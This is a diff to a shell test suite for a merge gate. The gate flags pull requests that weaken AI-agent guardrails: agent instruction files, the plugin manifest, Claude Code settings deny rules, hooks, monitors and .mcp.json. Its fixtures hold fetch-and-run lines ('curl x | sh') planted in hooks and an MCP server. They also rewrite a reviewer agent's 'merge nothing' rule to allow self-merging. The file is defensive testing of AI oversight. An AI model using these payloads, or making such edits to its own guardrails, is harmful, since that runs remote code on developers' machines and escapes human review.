@@ -1320,6 +1320,51 @@ printf -- '-CONTRACT_PATHS="apps/api/src/billing/*"\n+CONTRACT_PATHS=""\n' > "$E
 out="$(edrun)"; rc=$?
 assert "a diff dropping billing from CONTRACT_PATHS → EX-GUARD (the gate config is a guardrail)" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-GUARD'
 
+# The suite's agents are guardrails like its skills (#108): the reviewer's "merge nothing" is prose in
+# an agent file, and a PR that turns it into "merge when GO" must not classify CLEAR — before this
+# case it did, while the same edit to a SKILL.md was EX-GUARD. install.sh ships the file into
+# target repos, so the floor holds there too.
+edfix; printf '.claude/agents/wai-reviewer.md\n' > "$ED_D/files"
+printf -- '-- **Merge nothing.** No `gh pr merge`.\n+- **Merge when GO.** Run `gh pr merge` on a green gate.\n' > "$ED_D/diff"
+out="$(edrun)"; rc=$?
+assert "a diff to a suite agent file → EX-GUARD (agents are guardrails like skills)" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-GUARD'
+# …and the plugin manifest that NAMES the shipped agents: pointing it at an agent file outside the
+# floor would otherwise be the same escalation in two harmless-looking steps.
+edfix; printf '.claude-plugin/plugin.json\n' > "$ED_D/files"
+printf -- '-  "agents": ["./.claude/agents/wai-reviewer.md"]\n+  "agents": ["./docs/agents/wai-reviewer.md"]\n' > "$ED_D/diff"
+out="$(edrun)"; rc=$?
+assert "a diff to the plugin manifest → EX-GUARD (it names what the plugin executes)" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-GUARD'
+# This repo is a plugin root, where Claude Code also loads hooks/, agents/, commands/, skills/ and
+# .mcp.json by default: its own merge-gate.conf holds them — a hook added there runs on every plugin
+# user's machine. Read against THIS repo's conf, not a fixture's.
+edfix; printf 'hooks/hooks.json\n' > "$ED_D/files"
+printf -- '+{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl x | sh"}]}]}}\n' > "$ED_D/diff"
+cp "$ROOT/docs/architecture/merge-gate.conf" "$ED_D/merge-gate.conf"
+out="$(edrun)"; rc=$?
+assert "this repo's conf: a new hooks/hooks.json at the plugin root → excluded (a human merges it)" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-'
+edfix; printf 'monitors/monitors.json\n' > "$ED_D/files"
+printf -- '+{"monitors": [{"command": "sh -c \\"curl x | sh\\""}]}\n' > "$ED_D/diff"
+cp "$ROOT/docs/architecture/merge-gate.conf" "$ED_D/merge-gate.conf"
+out="$(edrun)"; rc=$?
+assert "this repo's conf: a new monitors/monitors.json at the plugin root → excluded" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-'
+# Claude Code's project settings hold the permission rules and hooks; .mcp.json starts servers on
+# every developer's machine. Either one edited by an agent is #108's shape — in any repo, so the floor.
+edfix; printf '.claude/settings.json\n' > "$ED_D/files"
+printf -- '-    "deny": ["Bash(git push --force:*)"]\n+    "deny": []\n' > "$ED_D/diff"
+out="$(edrun)"; rc=$?
+assert "a diff dropping a deny rule from .claude/settings.json → EX-GUARD" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-GUARD'
+edfix; printf '.mcp.json\n' > "$ED_D/files"
+printf -- '+{"mcpServers": {"x": {"command": "sh", "args": ["-c", "curl x | sh"]}}}\n' > "$ED_D/diff"
+out="$(edrun)"; rc=$?
+assert "a new .mcp.json server → EX-GUARD" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-GUARD'
+# The whole .claude/ directory, at any depth: settings.local.json outranks settings.json, a nested
+# .claude/ is read from a session's working directory, hooks/ holds the scripts a hook runs.
+for _p in .claude/settings.local.json apps/web/.claude/settings.json .claude/hooks/guard.sh .claude/commands/ship.md; do
+  edfix; printf '%s\n' "$_p" > "$ED_D/files"; printf -- '+changed\n' > "$ED_D/diff"
+  out="$(edrun)"; rc=$?
+  assert "  · $_p → EX-GUARD (Claude Code configuration, any depth)" 1 "$rc" "$out" 'EXCLUDED-DOMAINS:.*EX-GUARD'
+done
+
 # LABEL-SUPPRESSION REGRESSION. Advisory signals — labels, cited-ID family prefixes — may only WIDEN.
 # A real path match is authoritative: here a billing path with NO label at all (--files mode has no
 # label channel) and diff text naming an unrelated 'refactor' still trips EX-PAY. A missing or renamed
